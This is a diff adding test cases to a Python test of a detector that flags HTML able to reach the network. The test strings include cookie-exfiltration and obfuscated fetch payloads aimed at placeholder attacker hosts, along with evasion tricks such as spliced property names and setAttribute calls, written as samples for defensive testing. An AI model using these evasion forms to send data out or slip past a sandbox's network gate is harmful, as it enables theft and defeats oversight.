@@ -991,6 +991,9 @@ def test_render_html_gated_only_when_networked():
     assert rh("<video poster='https://evil/x.png'></video>") is True
     assert rh("<object data='https://evil/x'></object>") is True
     assert rh("<a ping='https://evil/x'>link</a>") is True
+    assert rh("<img srcset='local.png 1x, https://evil/x.png 2x'>") is True
+    assert rh("<a ping='local https://evil/x'>link</a>") is True
+    assert rh("<script>const data = '/tmp/file.json'</script>") is False
     # Self-navigation sinks exfiltrate by navigating the frame away.
     assert rh("<script>location.href='https://x/?d='+document.cookie</script>") is True
     assert rh("<script>location.assign('https://x')</script>") is True
@@ -1003,9 +1006,13 @@ def test_render_html_gated_only_when_networked():
     assert rh("<script>fetch/*x*/('https://example.com')</script>") is True
     assert rh("<script>window['fetch']('https://example.com')</script>") is True
     assert rh("<script>window[`fetch`]('https://example.com')</script>") is True
+    assert rh("<script>window[`fet`+`ch`]('https://example.com')</script>") is True
     assert rh("<script>window['fetch'.replace('x','x')]('https://x')</script>") is True
     assert rh("<script>window['fetch'+suffix]('https://x')</script>") is True
     assert rh("<script>window[key]('https://x')</script>") is True
+    assert rh("<script>window?.['fetch']('https://x')</script>") is True
+    assert rh("<script>this['fetch']('https://x')</script>") is True
+    assert rh("<script>this[`fet`+`ch`]('https://x')</script>") is True
     assert rh("<script>frames[0]</script>") is False
     assert (
         rh(
@@ -1014,6 +1021,37 @@ def test_render_html_gated_only_when_networked():
         )
         is True
     )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute?.('src','https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('s'+'rc','https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('srcset','local.png 1x, https://evil/x.png 2x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const a=document.createElement('a');"
+            "a.setAttribute('ping','local https://evil/x')</script>"
+        )
+        is True
+    )
+    assert rh("<script>const i={};i.setAttribute(name,'https://evil/x')</script>") is True
+    assert rh("<script>const i={};i.src='https://evil/x'</script>") is True
+    assert rh("<script>const i={};i.srcset='local.png 1x, https://evil/x 2x'</script>") is True
     # A computed bracket key spliced from string fragments on a global host object.
     assert rh("<script>window['fet'+'ch']('https://attacker.example')</script>") is True
     assert rh("<script>self['open' + '']('https://x')</script>") is True
@@ -1030,6 +1068,24 @@ def test_render_html_gated_only_when_networked():
         )
         is False
     )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute?.('src','./local.png')</script>"
+        )
+        is False
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('s'+'rc','./local.png')</script>"
+        )
+        is False
+    )
+    assert rh("<script>const i={};i.setAttribute(name,'./local.png')</script>") is False
+    assert rh("<script>const i={};i.setAttribute('class','https://evil/x')</script>") is False
+    assert rh("<script>const i={};i.setAttribute('disabled')</script>") is False
+    assert rh("<script>const i={};i.src='./local.png'</script>") is False
     assert (
         rh(
             "<script>const a=document.createElement('a');"
